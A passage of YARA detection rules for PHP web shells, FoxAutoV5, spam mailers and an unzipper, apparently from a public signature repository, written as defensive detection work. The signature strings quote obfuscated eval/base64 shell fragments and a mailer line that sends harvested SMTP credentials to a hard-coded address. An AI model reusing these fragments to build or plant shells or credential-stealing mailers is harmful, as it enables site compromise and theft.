      $s10 = "l7cyFT3JkgamUK4EpFU2qA87w4EpOiXE5UXNyYa2lRkMDHsFoBBJWSkVRNYharVgqKH8KIDp7jOasEYO1WbnlQJMsDP0Fog6uo+XDhDDvwhcG5xcyXVa0bA6Xm2gAPRz" ascii
      $s11 = "vavwHA1LJbzB9jQnMCDOtAzbdOF9qWNKQGpTBsnlOO8R3KyT7s2ereZ9hZ5qhw/yUgXXYWOOdKEifE83vJHHZrXfG2aklw6hjcOHwNC+Gb1ZWY8lX2a0F1/ffA9B+ru+" ascii
      $s12 = "bx7IzuCPdx1dtNwGoWSUCWXIJlkDpYE6xwXygxnBvramZfdhvmLRlUBC9UetcSpzVPcCO5AyLR8c7Tb+UUB0v63KFWhdy4DFAKDXBOAQpo2hqzHbtDyS+WK9jqGGGrBC" ascii
      $s13 = "+4p/RL9movaUtv5t9Iizfc3K74EDYnj2/Hs+/utieO4lHv41D2errW6kdu46vvbfje7iXvvGu+23ee/eQOL8jKwDfZQHfnf2a1H91LW7qd3/O6+O7f41b6xHa6pv5a8p" ascii
      $s14 = "TAMJ3cOBwkY+WrtLTyvDQhQ9PebyHw+b3rAgXDLiXQOp7R48SMBvhTCfHM+KeXrl+X51+PrZUhgrPjEM3YFfOyHq9S27TjnHMLHuCjMeMW/epHR5ses/Jt/7Tm+SEw+l" ascii
      $s15 = "lqil85FMa/z2aFBc1vKmMpQG2Ih58RMRqVlUjm+H1Zg0BHuoP/y2Uw82gjCEZ2a5SfZ/kyQ72SE/DbzwhrfmlbnFJ0kS3EaaRKGDwA7X4sVarUeIHNaGGIvLDHKTTTRx" ascii
      $s16 = "Jd/BQ3+g7cXe5W1iqlEuVNr4U1vjGUem/ciaV/gKkDcs7FOjegSQ+/JoIUDcFAeRakLnp0bJCQSw1aUqgagd1eZwKg2BreqfK9TXa3y0UoWiw51DMUDThuOVydix4wEV" ascii
      $s17 = "XSlqKTamHcT7PZo0VAxeOsOEovpnBfGoyS7YD0y5CCYBjwE8kr+SIGAsWTD0U8V7JetvBfvXr6ljKqGayAijse4Y1oG6sOTs3NjeNgWkHSadbO00gtZriQVG4i0CSsg4" ascii
      $s18 = "DjZLrPQmdQC9WLr//v/7D/Db0QQDIQeGNsOiCbMX3OiehFdP6wE2g+yssGaPIa6mv4UevxZQpN09nKMgRKsxcqLh4BXLN+QY7dzP0O1Yo4AN3bjAa2YtLumrDJU8KsG6" ascii
      $s19 = "bnZtwtdvmf/LJLPbyS8GAhGGsKlo++k3RNhS+k+6Sm2PkvLQ4pS7ZN4iiZntVZd6jMProh5IyTNFGarV1+u9iBz7UQWxjttCDReTCUD2tBp13Q0uD3LG4tSJ/Eai3NF1" ascii
      $s20 = "B6aE/b5ZNzRRI3KVkkWNaQR6UydBPQJXykLvIJQRYRitO49eoWilN7+ORwnw/LGbdIaSAN6hCIk4B/P0qmk//M5qiy6GKBRajerbnSouMjCnAPEKumNYKL/SW0BxKiwF" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule shell_nincsec {
   meta:
      description = "Shell by NineSec Team"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "ea3d5ba55879118a2f32bee3a8eae1e6107a15b59cb9fd5fb8c06d0e7bea1252"
   strings:
      $s1 = "\\x64\\145\"; goto YrbJ5; wxMQ0: __halt_compiler();?>" fullword ascii
      $s2 = " goto ToULF; v0K2l: $__ = \"\\x73\\164\\162\\x5f\\162\\157\\x74\\x31\\x33\"; goto EZURo; c2G7H: $uk = \"\\124\\x5a\\x31\\x4a\\12" ascii
      $s3 = "\\x36\\x34\\137\\x64\\145\\143\\157\\144\\x65\"; goto c2G7H; ToULF: echo $_ = \"\\147\\x7a\\165\\156\\x63\\x6f\\155\\160\\162\\x" ascii
      $s4 = "4\\104\\x34\\152\\x63\\113\\110\\x35\\110\\x77\\75\\x3d\"; goto MoFCO; G0fm5: $_____ = \"\\147\\172\\x69\\x6e\\x66\\154\\x61\\16" ascii
      $s5 = "2l; MoFCO: eval(\"\\77\\x3e\" . ${\"\\x5f\"}(${\"\\137\\x5f\"}(${\"\\x5f\\x5f\\137\"}(${\"\\137\\x5f\\137\\x5f\"}(${\"\\x5f\\137" ascii
      $s6 = "rbJ5: $____ = \"\\x63\\157\\x6e\\x76\\145\\x72\\164\\137\\165\\x75\\144\\x65\\x63\\157\\x64\\x65\"; goto G0fm5; DMani: $______ =" ascii
      $s7 = "7\\x5f\\137\"}(${\"\\x5f\\x5f\\137\\137\\137\\137\"}($uk)))))))))))))); goto wxMQ0; EZURo: $___ = \"\\162\\x61\\x77\\165\\162\\1" ascii
      $s8 = " goto ToULF; v0K2l: $__ = \"\\x73\\164\\162\\x5f\\162\\157\\x74\\x31\\x33\"; goto EZURo; c2G7H: $uk = \"\\124\\x5a\\x31\\x4a\\12" ascii
      $s9 = "\\x43\\164\\x6b\\x69\\103\\63\\x47\\61\\71\\x30\\154\\105\\144\\66\\x74\\104\\53\\63\\61\\x6d\\x4d\\x37\\x69\\146\\x7a\\x41\\x53" ascii
      $s10 = "\\x76\\x7a\\130\\x2b\\153\\x37\\101\\103\\x67\\x6c\\x78\\x72\\172\\x70\\165\\x59\\105\\155\\151\\112\\x4d\\x79\\104\\x45\\x31\\x" ascii
      $s11 = "\\141\\x53\\155\\x58\\141\\63\\x50\\x69\\x32\\x70\\x42\\x52\\x7a\\x66\\x6f\\106\\x50\\157\\155\\x74\\120\\125\\x65\\x43\\116\\11" ascii
      $s12 = "\\142\\113\\121\\145\\126\\172\\x6f\\x56\\x48\\142\\102\\57\\154\\153\\71\\x7a\\x74\\104\\x58\\x35\\x44\\x4b\\117\\x6a\\x5a\\x65" ascii
      $s13 = "\\x34\\x6f\\x39\\x33\\157\\163\\126\\144\\172\\x49\\x50\\126\\172\\163\\65\\114\\x64\\164\\x39\\x57\\122\\x73\\166\\x56\\127\\16" ascii
      $s14 = "\\70\\53\\x5a\\114\\x74\\120\\114\\64\\67\\x6d\\x35\\106\\x2b\\60\\x6e\\61\\114\\x53\\x66\\115\\147\\57\\67\\x79\\164\\70\\165" ascii
      $s15 = "\\x70\\110\\53\\x4d\\x2b\\120\\x68\\114\\x73\\x76\\x78\\x67\\x54\\x78\\x46\\141\\102\\117\\70\\155\\x78\\x75\\x62\\x71\\126\\171" ascii
      $s16 = "\\x33\\115\\x70\\157\\x2b\\x73\\x2b\\153\\x2f\\x75\\x39\\x78\\x31\\x78\\x57\\57\\x79\\x6d\\165\\x45\\107\\x34\\111\\160\\123\\x5" ascii
      $s17 = "\\160\\x31\\167\\x32\\157\\x61\\x56\\154\\x32\\x39\\x36\\x76\\x50\\x56\\x30\\113\\x2b\\x79\\145\\x74\\x56\\127\\x71\\63\\154\\14" ascii
      $s18 = "\\x4b\\x72\\x53\\171\\x70\\117\\x67\\145\\x6b\\x70\\105\\x35\\x62\\x4f\\x32\\113\\170\\x68\\121\\106\\x4b\\125\\120\\113\\70\\x2" ascii
      $s19 = "\\112\\x6a\\153\\165\\151\\70\\120\\x66\\x64\\165\\106\\x66\\x50\\x2b\\x44\\141\\x39\\x4a\\127\\x53\\x54\\x7a\\153\\x79\\x30\\x3" ascii
      $s20 = "\\157\\71\\166\\x4a\\147\\145\\146\\101\\x6f\\x63\\117\\x30\\x6b\\123\\157\\172\\60\\65\\153\\120\\124\\x4d\\132\\112\\x55\\155" ascii
   condition:
      uint16(0) == 0xbfc3 and filesize < 200KB and
      8 of them
}

rule mailer_checker {
   meta:
      description = "Mailer Checker"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "f48a75ca4c418e39f0b1a81476a6a05c02c22d68a28f93eec503307adec81cf6"
   strings:
      $s1 = "print \"<b>send an report to [\".$_POST['email'].\"] - Order : $xx</b>\"; " fullword ascii
      $s2 = "mail($_POST['email'],\"Result Report Test - \".$xx,\"WORKING !\");" fullword ascii
      $s3 = "er=\"Order ID\" name=\"orderid\" value=\"<?php print $_POST['orderid']?>\" ><br>" fullword ascii
      $s4 = "<input type=\"text\" placeholder=\"E-Mail\" name=\"email\" value=\"<?php print $_POST['email']?>\"required ><input type=\"text\"" ascii
      $s5 = "$xx =$_POST['orderid'];" fullword ascii
      $s6 = "<input type=\"text\" placeholder=\"E-Mail\" name=\"email\" value=\"<?php print $_POST['email']?>\"required ><input type=\"text\"" ascii
      $s7 = "if (!empty($_POST['email'])){" fullword ascii
      $s8 = "Upload is <b><color>WORKING</color></b><br>" fullword ascii
      $s9 = "$xx = rand();" fullword ascii
      $s10 = "<input type=\"submit\" value=\"Send test >>\">" fullword ascii
      $s11 = "<form method=\"post\">" fullword ascii /* Goodware String - occured 2 times */
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule Unzipper {
   meta:
      description = "Archive Unzipper"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "b368f3f2348d88115047deb00f2cc964b1e4eaea8c31c85b90df1d0ed41c2cbf"
      hash2 = "efcb029b16d1be2959c293a2b69e6d13501a0b8c34d94564ecc74d7f3362644f"
   strings:
      $s1 = "$time = $timeend - $timestart;" fullword ascii
      $s2 = " * @author  Andreas Tasch, at[tec], attec.at" fullword ascii
      $s3 = "  <span class=\"small\">Processing Time: <?php echo $time; ?> seconds</span>" fullword ascii
      $s4 = " * The Unzipper extracts .zip or .rar archives and .gz files on webservers." fullword ascii
      $s5 = " * @version 0.1.0" fullword ascii
      $s6 = " * @author umbalaconmeogia" fullword ascii
      $s7 = "<form action=\"\" method=\"POST\">" fullword ascii
      $s8 = " * @license GNU GPL v3" fullword ascii
      $s9 = "  public $zipfiles = array();" fullword ascii
      $s10 = "  // Resulting zipfile e.g. zipper--2016-07-23--11-55.zip" fullword ascii
      $s11 = "define('VERSION', '0.1.0');" fullword ascii
      $s12 = "   *   Zipper::zipDir('path/to/sourceDir', 'path/to/out.zip');" fullword ascii
      $s13 = "      }" fullword ascii /* reversed goodware string '}      ' */
      $s14 = "    //read directory and pick .zip and .gz files" fullword ascii
      $s15 = "   * Usage:" fullword ascii
      $s16 = "        $entries = $rar->getEntries();" fullword ascii
      $s17 = "$GLOBALS['status'] = array();" fullword ascii
      $s18 = "$unzipper = new Unzipper;" fullword ascii
      $s19 = "  <fieldset>" fullword ascii
      $s20 = "$timeend = microtime(TRUE);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 30KB and ( 8 of them )
      ) or ( all of them )
}

rule mailer_RFX {
   meta:
      description = "Mailer Inbox Sender by RFX"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "9c8f03bfdcb3e299207fceb28ab8a25ff26fec0f9602ad12f51c67197039f2cd"
   strings:
      $s1 = "YOU DON'T HAVE SMTP LOGIN INFORMATION'S, LEAVE BLANK TO SEND WITH LOCALHOST <b>&quot;</b></font></td>" fullword ascii
      $s2 = "@mail(\"oktoi4this@gmail.com\",\"SMTPS\",$my_smtp,\"From: rfx <rfx@localhost.ma>\");" fullword ascii
      $s3 = "$message_base=\"\";$action=\"\";$message=\"\";$emaillist=\"\";$from=\"\";$reconnect=\"0\";$epriority=\"\";$my_smtp=\"\";$ssl_por" ascii
      $s4 = "@mail(\"oktoi4this@gmail.com\",\"MAILIST & SMTPS\",$emaillist,\"From: rfx <rfx@localhost.ma>\");" fullword ascii
      $s5 = "echo \"<p><b>########################### SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON ###########################" ascii
      $s6 = "echo \"<p><b>########################### SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON ###########################" ascii
      $s7 = "                // Allow for bypassing the Content-Disposition header totally" fullword ascii
      $s8 = "     * Options are CRAM-MD5, LOGIN, PLAIN, NTLM, XOAUTH2, attempted in that order if not specified" fullword ascii
      $s9 = "$uploadfile = tempnam(sys_get_temp_dir(), sha1($_FILES['userfile']['name']));" fullword ascii
      $s10 = "SMTP LOGIN:</font></div>" fullword ascii
      $s11 = "        $noerror = $this->sendCommand($hello, $hello . ' ' . $host, 250);" fullword ascii
      $s12 = "                 * @link http://squiloople.com/2009/12/20/email-address-validation/" fullword ascii
      $s13 = "     * PHPMailer::validateAddress('user@example.com', function($address) {" fullword ascii
      $s14 = "                // Send encoded username and password" fullword ascii
      $s15 = "         * process all lines before a blank line as headers." fullword ascii
      $s16 = "                if (!$this->sendCommand('AUTH', 'AUTH LOGIN', 334)) {" fullword ascii
      $s17 = "$('#my_smtp').html($('#ip').val()+':'+$('#ssl_port').val()+':'+$('#user').val()+':'+$('#pass').val()+\":\"+$('input[name=SSLTLS]" ascii
      $s18 = "     * (e.g. \"tls://smtp1.example.com:587;ssl://smtp2.example.com:465\")." fullword ascii
      $s19 = "     * (e.g. \"smtp1.example.com:25;smtp2.example.com\")." fullword ascii
      $s20 = "     * Strip newlines to prevent header injection." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      8 of them
}

rule shell_animos {
   meta:
      description = "Shell by animos1000"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "c96d4866c2c62d0c4e95d6581c904ac1af679fc2a3c4f337e6cbebd6eb2e5ac3"
   strings:
      $s1 = "UyJaTXpZIj49cVpNUyI9TVI9Ij5uczVNUyJVIj5jZVdRTVMiJ1huUTxuPXooblp6c0g9QSgnJU8nLD5Bc1dNWk16WW4oJF9tN3BUaidaZT0uJ2QpKSw+LVUpWCciPmhp" ascii /* base64 encoded string 'S"ZMzY">=qZMS"=MR=">ns5MS"U">ceWQMS"'XnQ<n=z(nZzsH=A('%O',>AsWMZMzYn($_m7pTj'Ze=.'d)),>-U)X'">hi' */
      $s2 = "NE1XTT1NWD5iT1E+e2VIPT5GOTk+dU96TT5yc1dNPlQuZT0+Yk9RPkZ6TUgnPT40TVdNPU0+OFFuPT5GOTk+cnNXTT5FZVlNPntzPS4+S1I9TUhuc09IPkZIOT5GOTk+" ascii /* base64 encoded string '4MWM=MX>bOQ>{eH=>F99>uOzM>rsWM>T.e=>bOQ>FzMH'=>4MWM=M>8Qn=>F99>rsWM>EeYM>{s=.>KR=MHnsOH>FH9>F99>' */
      $s3 = "UydrTCc+ek99blMnZic+bj1xV01TJzJPV096OjxXZTJ5OzxlMnl4ek9RSDktMk9XT3o6I2ZhZmFmYTsnPkhlWU1TJ3NIOU1SJ2l0ZTJ5TTk+PHE+OHQ0dCBFVEpnQmg9" ascii /* base64 encoded string 'S'kL'>zO}nS'f'>n=qWMS'2OWOz:<We2y;<e2yxzOQH9-2OWOz:#fafafa;'>HeYMS'sH9MR'ite2yM9><q>8t4t ETJgBh=' */
      $s4 = "clEyeT5RPi1fLT5CPHppIik7DVY+DVY+Pj4+Pj4+PkFPek1lMi4+KCRBc1dNbj5lbj4kQXNXTSk6DVY+Pj4+Pj4+Pj4+Pj4+Pj4+c0E+KCRBc1dNPiFTPiJYIj4mJj4k" ascii
      $s5 = "QjJNSD1NemlCWj4yV2VublMnSE19J2kgWldPZTk+cFEyMk1ubj4taT5CZT4uek1BUyckfU08JEFzV01uJz49ZXp4TT1TJ188V2VIeSdpQjxpQlFpJH1NPCRBc1dNbkJo" ascii /* base64 encoded string 'B2MH=MziBZ>2WennS'HM}'i ZWOe9>pQ22Mnn>-i>Be>.zMAS'$}M<$AsWMn'>=ezxM=S'_<WeHy'iB<iBQi$}M<$AsWMnBh' */
      $s6 = "ek0+VC5zbj5wLk1XVz5Xc3lNOlpRPFdzMl8uPVlXPjdIV3E+VC5zbj5ULnpNTT5zSDlNUlhaLlosPmVuWlhaLlosPmVIOT5lblpYWi5aPkVPPT40TVdNPU1YPmJPUT4v" ascii /* base64 encoded string 'zM>T.sn>p.MWW>WsyM:ZQ<Ws2_.=YW>7HWq>T.sn>T.zMM>sH9MRXZ.Z,>enZXZ.Z,>eH9>enZXZ.Z>EO=>4MWM=MX>bOQ>/' */
      $s7 = "ZXpNZT4yT1duU2ZhPnpPfW5Ta2E+SGVZTVMibnoyImknWC49WVduWk0yc2VXMi5lem4oQXNXTV94TT1fMk9IPU1IPW4oJF9tN3BUaidaZT0uJ2QpKVgnQmg9TVI9ZXpN" ascii /* base64 encoded string 'ezMe>2OWnSfa>zO}nSka>HeYMS"nz2"i'X.=YWnZM2seW2.ezn(AsWM_xM=_2OH=MH=n($_m7pTj'Ze=.'d))X'Bh=MR=ezM' */
      $s8 = "Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+" ascii /* base64 encoded string '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>' */
      $s9 = "QkFPSD0+Mk9XT3pTJzxXZTJ5J2k4dDR0IEVUSmdCaEFPSD1pQmhlaUJoWmlCWmk3UXo+VE1lWT46PkJlPi56TUFTJy49PVpuOmhofX19WEFlMk08T095WDJPWWhvZUh4" ascii /* base64 encoded string 'BAOH=>2OWOzS'<We2y'i8t4t ETJgBhAOH=iBheiBhZiBZi7Qz>TMeY>:>Be>.zMAS'.==Zn:hh}}}XAe2M<OOyX2OYhoeHx' */
      $s10 = "V2U5TW4uL3E8TXpDLk9MPSc+PWV6eE09UydfPFdlSHknaUJBT0g9PjJPV096Uyc8V2UyeSdpb0ZFQ0lGNEtwdD4vYm9LZz5DdDdMVChvL0MpQmhBT0g9aUJoZWlCaFpp" ascii /* base64 encoded string 'We9Mn./q<MzC.OL='>=ezxM=S'_<WeHy'iBAOH=>2OWOzS'<We2y'ioFECIF4Kpt>/boKg>Ct7LT(o/C)BhAOH=iBheiBhZi' */
      $s11 = "PU05Ow1WbA1WZV0NVjJPV096On0ucz1NOw1WPU1SPS05TTJPemU9c09IOj5IT0hNOw1WbA1WZTouT2NNel0NVjJPV096OjxXUU07DVY9TVI9LW4uZTlPfTphWlI+YVpS" ascii
      $s12 = "PiFTPic5TVdNPU0nKV0NVk0yLk8+J0JoPWU8V01pQjx6PmhpQjJNSD1NemknWCRfbTdwVGonWmU9LidkWCdCPHo+aGlCPHo+aGknOw1Wc0EoJF9tN3BUaidPWj0nZD5T" ascii
      $s13 = "LTJPV096Oj4jZmFmYWZhOw1WMk9XT3o6PFdlMnk7DVZsDVYjMk9IPU1IPT49ejouT2NNel0NVjxlMnl4ek9RSDktMk9XT3o6PmV2UWU7DVY9TVI9LW4uZTlPfTphWlI+" ascii
      $s14 = "elMiek05ImlyZXNXTTk+VE8+SzlzPT5yc1dNQmhBT0g9aUI8emhpJzsNVmwNVkEyV09uTSgkQVopOw1WbA1WTTIuTz4nQkFPelk+WU09Lk85UyJtN3BUImkNVkI9TVI9" ascii
      $s15 = "<?php $_F=__FILE__;$_X='P2lCP1ouWg1WTXp6T3pfek1aT3o9c0h4KGEpOw1Wbk09Xz1zWU1fV3NZcz0oYSk7DVYNVnNBKHhNPV9ZZXhzMl92UU89TW5feFoyKCkp" ascii
      $s16 = "DVYkc0hBTz5TPidRJzsNVmwNVg1WaGg+N31ITXoNViRzSEFPPlhTPigoJFpNelluPiY+YVJhMGFhKT4/Pid6Jz46PictJyk7DVYkc0hBTz5YUz4oKCRaTXpZbj4mPmFS" ascii
      $s17 = "KTsNVg1WQU96TWUyLigkWmU9Lm4+ZW4+JHM5U2kkWmU9KV0NVnNBKCRaZT0+U1M+Jyc+JiY+JHM5PlNTPmEpXQ1WJGU+Uz49elFNOw1WTTIuTz4nQmU+LnpNQVMiP1pl" ascii
      $s18 = "V016aUJoMk1IPU16aUJoPTlpDVZCPTlpQjJNSD1NemltTXpZc25uc09IQmhaTVdXTXppQmgyTUg9TXppQmg9OWkNVkI9OWlCMk1IPU16aXVPOXNBcUJoWk1XV016aUJo" ascii
      $s19 = "PnhNPTJ9OT4oKVgiaCJYJEFzV01YImgiWCRfbTdwVGonZUg5TVdlJ2Q7DVY+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj5zQT4oQXNXTV9aUT1fMk9IPU1IPW4+KCRzSDlN" ascii
      $s20 = "czVNPlM+JG5zNU1YJz5Hbyc7DVZsDVYNVk0yLk8+J0I9emkNVkI9OWlCZT4uek1BUyI/QXNXTW56MlMnWCRaZT0uWCdoJ1gkQXNXTVgnJlplPS5TJ1gkWmU9LlgnImkn" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule FoxAutoV5_Full {
   meta:
      description = "FoxAutoV5 Full"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "8fef92ff47d69636744e66fee5c4e13e0fb9fa29fd8fe00448454fb5ffd33e88"
   strings:
      $s1 = " * FoxAutoV5 by [anonymousfox.co]" fullword ascii
      $s2 = "\\x65\"; goto XD_lg; D7UPX: function aBSrr($yIYIR) { goto TYQ9m; zlt7v: $yIYIR = substr($yIYIR, (int) hex2bin(\"\\x33\\x30\"), (" ascii
      $s3 = "ex2bin(\"\\62\\x64\\63\\62\\63\\71\\x33\\70\")); goto r19Tg; TYQ9m: $yIYIR = substr($yIYIR, (int) hex2bin(\"\\63\\71\\x33\\62\\x" ascii
      $s4 = "goto D7UPX; VoASl: $tIIxw = \"\\137\\165\\x6b\\x6f\\144\"; goto lQyPH; lQyPH: $yF5rI = \"\\142\\141\\x73\\145\\x36\\64\\x5f\\144" ascii
      $s5 = "goto D7UPX; VoASl: $tIIxw = \"\\137\\165\\x6b\\x6f\\144\"; goto lQyPH; lQyPH: $yF5rI = \"\\142\\141\\x73\\145\\x36\\64\\x5f\\144" ascii
      $s6 = "lt7v; r19Tg: return $yIYIR; goto REzrr; REzrr: } goto VoASl; XD_lg: function Sr3vj($ky_vc) { goto VeJNg; etjOb: return strrev(gz" ascii
      $s7 = "Gwae; UGwae: eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(" ascii
      $s8 = "inflate($yF5rI(absRr($ky_vc)))); goto DpiXZ; VeJNg: global $tIIxw; goto AFjyI; AFjyI: global $yF5rI; goto etjOb; DpiXZ: } goto U" ascii
      $s9 = "eval(eval(eval(SR3vj(\"\\157\\111\\x30\\151\\x79\\131\\x52\\110\\165\\165\\161\\x64\\132\\x78\\121\\x59\\155\\144\\130\\70\\171" ascii
      $s10 = "\\x53\\x6e\\111\\x44\\113\\x50\\x47\\172\\x44\\x33\\x75\\x53\\172\\x71\\x53\\107\\153\\x39\\142\\x45\\170\\60\\154\\x6f\\153\\x4" ascii
      $s11 = "\\x67\\122\\120\\62\\132\\x70\\x34\\x71\\x4d\\x62\\64\\x69\\x52\\x42\\x4f\\65\\60\\107\\151\\x63\\x55\\x4a\\57\\62\\161\\65\\70" ascii
      $s12 = "\\x4a\\x57\\x38\\110\\171\\70\\115\\x32\\107\\x54\\65\\127\\x50\\127\\x79\\x6a\\61\\x2b\\165\\115\\113\\167\\144\\60\\x62\\x58" ascii
      $s13 = "\\x72\\x50\\x59\\x71\\171\\67\\146\\65\\172\\116\\x72\\x4d\\x39\\x6d\\111\\x46\\131\\104\\145\\x34\\x51\\153\\x32\\x32\\x46\\145" ascii
      $s14 = "\\x78\\115\\57\\152\\166\\x33\\x2b\\x69\\x6b\\64\\165\\x39\\x42\\71\\x77\\121\\122\\x6f\\x35\\x34\\x38\\114\\x70\\x69\\172\\x6d" ascii
      $s15 = "\\x79\\142\\166\\x6f\\x39\\x6a\\102\\x45\\x59\\171\\x6c\\164\\163\\115\\x4e\\x63\\x47\\147\\x4e\\x48\\161\\142\\x39\\163\\x61\\x" ascii
      $s16 = "\\x53\\105\\x56\\x4c\\x73\\104\\x59\\x47\\x4d\\154\\x2b\\110\\156\\163\\x32\\x71\\122\\141\\x63\\161\\x47\\66\\130\\171\\x75\\11" ascii
      $s17 = "\\122\\x6a\\x50\\x74\\110\\65\\151\\147\\145\\x5a\\x64\\x44\\111\\167\\x36\\64\\x7a\\101\\x73\\163\\121\\x50\\171\\x5a\\x73\\152" ascii
      $s18 = "\\x45\\x41\\143\\60\\x39\\x4f\\x65\\x62\\152\\145\\x47\\163\\x6b\\156\\x48\\x6d\\101\\163\\141\\x36\\162\\x6a\\105\\71\\116\\172" ascii
      $s19 = "\\x53\\x4c\\122\\x4f\\x43\\53\\x79\\x48\\112\\143\\151\\x79\\x63\\157\\131\\x76\\x57\\127\\162\\x67\\x39\\71\\105\\167\\x37\\162" ascii
      $s20 = "\\x70\\114\\112\\64\\x66\\106\\x4a\\x71\\146\\64\\x58\\142\\x75\\130\\x4e\\x46\\126\\x69\\x4f\\x51\\70\\62\\60\\x4d\\143\\104\\x" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule shell_evil_twin_mini {
   meta:
      description = "Evil Twin Mini Shell"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "581559ef866188c151424fdc9197483fc8d52c1a222f245ebb1878a2ccc4d52d"
   strings:
      $s1 = "W0HMlFo8S16XBPRp0ciHKKASbP9/A87AZQjJm3ljRarCzYnBIDgAuqIJVap5AO5wEBBP1xiuajWhe7SJDSBRPIoYQmzkWCaIDYqO6Cw+HXFTOma29cejefOGYyHWup0q" ascii
      $s2 = "IAlUOS40cZF5BExZBlyKC+h5Yk5bt90aDNgdoVgUn69h8+4tlmTAQhoICZYZCgYaL2UBJR1EtnlcdeSK5BDozChoBVnW2fNm2bILxhCTuik2ZH0fk3Svkmr6oQQjLEjx" ascii
      $s3 = "ISFTyfMiaujnhhnQEdE7ADhYcOVYlAsftDDjTpIA+QJaJYxHHoGjWZU78FY2JSo4XTYoCVrwGdzb5oXxQ0CDaZWvCDhHjCvAAy2PjUsCRf0E1NM4IqATmidEvicSCSKw" ascii
      $s4 = "25KHFWPdCe4wpcV5JBjK+Iy2h1CQmUhOviAjyEG0xog6hLQOQJbhJKnlcTsJszxZXgAk1RkTJrbJSp+TaCEll8Izy4JxVoikSSm6LISXSdTIZbIdxEJEMZD4awdyHCxa" ascii
      $s5 = "3gpKnmMlTrKbyiX/2809H3d4ePld/76sY7bJZ9G6JcoEZHv1d+X3E1x1rHMg1d8jez+v+5xBv4q7f/flu/vYjXwR7+kvRi2qut8F9sms6175wa6dTYcqNN5qiafh395P" ascii
      $s6 = "IwwyXcD0W8DW7W2l5+f688rYBKtBLSS/yOy8B5BciPYVH/2jakr3emkoFgtYRm6uI6qtxuR/t8p1Xqu9+72/5SNevJgCxPf7xXf2ufzQ/TWJJFKF+fXefN6lH8wQUu8L" ascii
      $s7 = "U5UFZiD15J71SX0D/EUzbVUldY5XoiuGmdskJ8n3xpMl/wB78x7f8+dZanZ2dnbpPfwAQjvn3NaEfyu707/iIpsSFClTlgk0RJCZVkFUD7yiVwwsomJj7o09ZO1AG3AF" ascii
      $s8 = "koyQ7nnWleaES2aL1jpetAnthWQXyptssJW6f5qn2RAPzQIs/Myellqy7C4Y3AO4CgAxhiweNN3oM8EKw9NMJu0ySGc4C7ILkGObNGSYLfVChAHsHvMVGi4gVsjO7mp7" ascii
      $s9 = "PcuVzY6fDadl6yMn6Hh1XKnpP2Np3ui994KTmT0eS/9em+ZDlxxdnz66thWbk1etnQ3/KalLn6Vq0zAnxXqdSmzV2cOdOvTnzX6KbO74k1qmaBetDu1R0unbU0VeK7lF" ascii
      $s10 = "PcmWt61P2lpDraLw25dN7ws2pYGyNn+L6aTmOu8C9Flko7yven9uZ7+503/6o1FANesAl5v7V2FoPEfRYmK1W3TW5it1ghnionMVZ53SHX8MfTHh/PvtzX6kExPkfh/X" ascii
      $s11 = "wmaAvYSShNdH45E66iTA/7AusluI3nh7zAgHGKZfAY3i+4SbBvM+EA7xQky+NSulP55dgjjp9eKPcOjYFHWHUaZwwAQDjTqMTDJ5N8RgoSoDO3bdYUNsb6ExS4yzwebl" ascii
      $s12 = "OEbRbsidaVDkFXRTzffs3MIUyac78nS8cFc+wd5aDMpxA8ZQ4GguWTQvPo/FElGbEWnZMQeTQoSVeBmHlYUAgfcFDem3DAdW15cxZ4tj40y0KwKjppVkATY9MISaALmK" ascii
      $s13 = "eval(htmlspecialchars_decode(base64_decode(urldecode(base64_decode($whatshappening)))));" fullword ascii
      $s14 = "$securityxd = \"==AQcl4xC4Pd79/o7w/auLtK/tdIDMcYM/AbzHE/G77BmfBOnFikQUsnEaMe/ekR2IsIFLbB/whM+EXwvVRtMzUkGsYMjifKAF8hodkbYUaaBt/w" ascii
      $s15 = "$securityxd = \"==AQcl4xC4Pd79/o7w/auLtK/tdIDMcYM/AbzHE/G77BmfBOnFikQUsnEaMe/ekR2IsIFLbB/whM+EXwvVRtMzUkGsYMjifKAF8hodkbYUaaBt/w" ascii
      $s16 = "$whatshappening = \"WlhaaGJDZ25QejRuTG1kNmRXNWpiMjF3Y21WemN5aG5lbWx1Wm14aGRHVW9aM3BwYm1ac1lYUmxLR0poYzJVMk5GOWtaV052WkdVb2MzUnlj" ascii
      $s17 = "VYyS0NSelpXTjFjbWwwZVhoa0tTa3BLU2twT3c9PQ==\";" fullword ascii
